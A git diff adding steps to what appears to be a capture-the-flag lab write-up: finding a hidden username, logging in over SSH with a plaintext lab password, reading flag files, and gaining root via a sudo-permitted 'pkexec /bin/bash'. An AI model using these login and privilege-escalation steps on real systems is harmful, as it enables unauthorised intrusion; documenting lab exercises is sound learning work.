@@ -182,6 +182,68 @@ cat shado
 
 ### 12. User Enumeration : 
 
+#### Check hidden user file :
+```
+cat .other_user
+```
+#### Result :
+- Username : slade
+
+### 13. SSH Access :  
+#### Login via SSH
+```
+ssh slade@<target-ip>
+```
+<img width="991" height="612" alt="Screenshot 2026-04-23 121918" src="https://github.com/user-attachments/assets/694e34e5-49dc-471b-aa6d-3f7518b6d51f" />
+
+<br>
+
+#### Credentials :
+- username : slade
+- password : M3tahuman
+
+### 14.User Flag: 
+
+#### Retrieve user flag
+```
+cat user.txt
+```
+<img width="718" height="345" alt="Screenshot 2026-04-23 121941" src="https://github.com/user-attachments/assets/7148414b-486c-4306-91d3-1262cdbe06c4" />
+
+<br>
+
+### 15. Privilege Escalation : 
+
+#### check sudo permissions 
+```
+sudo -l
+```
+#### Observation :
+- pkexec can be executed as root
+
+#### Escalate privileges 
+```
+sudo pkexec /bin/bash
+```
+
+#### Verify root access
+```
+whoami
+```
+<img width="1031" height="269" alt="Screenshot 2026-04-23 122317" src="https://github.com/user-attachments/assets/b16c6686-7092-495b-bca9-45a7d59d6dfe" />
+
+<br>
+
+### 16. Root Flag :
+
+#### Retrieve root flag
+```
+cat /root/root.txt
+```
+
+<img width="1056" height="404" alt="Screenshot 2026-04-23 122358" src="https://github.com/user-attachments/assets/7b93eecf-aacf-401f-9b96-8dee7cfba50b" />
+<br>
+
 ### 17. Answers : 
 
 | Question | Answer |
